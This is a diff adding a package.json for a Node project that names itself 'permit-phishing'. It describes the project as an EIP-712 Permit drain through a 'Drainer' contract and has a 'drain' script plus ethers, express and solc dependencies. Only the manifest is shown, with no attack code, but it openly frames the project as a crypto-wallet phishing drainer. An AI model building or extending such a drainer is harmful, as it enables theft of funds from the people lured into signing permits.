@@ -1,0 +1,14 @@
+{
+  "name": "permit-phishing",
+  "version": "2.0.0",
+  "description": "Method 01: Permit Phishing — EIP-712 Permit drain via Drainer contract",
+  "type": "module",
+  "scripts": {
+    "drain": "node scripts/drain.mjs"
+  },
+  "dependencies": {
+    "ethers": "^6.13.4",
+    "express": "^4.21.0",
+    "solc": "^0.8.28"
+  }
+}
